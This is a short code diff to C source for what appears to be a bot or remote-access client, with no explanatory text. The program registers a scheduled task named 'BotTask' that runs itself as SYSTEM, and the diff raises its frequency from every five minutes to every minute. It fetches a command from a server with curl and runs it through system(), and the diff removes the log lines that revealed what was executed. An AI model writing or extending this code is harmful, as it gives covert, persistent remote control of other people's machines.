@@ -44,7 +44,7 @@ int main(int argc, char* argv[])
   char *filename;
   filename=strrchr(argv[0], '\\');
   if (filename==NULL){filename=argv[0];} else { filename++;}
-  snprintf(command, sizeof command, "SCHTASKS /Create /ST 00:00:00 /RU SYSTEM /TN BotTask /SC minute /MO 5 /TR \"C:\\%s\"", filename);
+  snprintf(command, sizeof command, "SCHTASKS /Create /ST 00:00:00 /RU SYSTEM /TN BotTask /SC minute /MO 1 /TR \"C:\\%s\"", filename);
   system(command);
 
   
@@ -61,15 +61,10 @@ int main(int argc, char* argv[])
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
     res = curl_easy_perform(curl);
 
-    printf("Execute `%s`\n", s.ptr);
     system(s.ptr);
     free(s.ptr);
 
     curl_easy_cleanup(curl);
-  }
-  else
-  {
-    printf("Can't init curl\n");
   }
   return 0;
 }
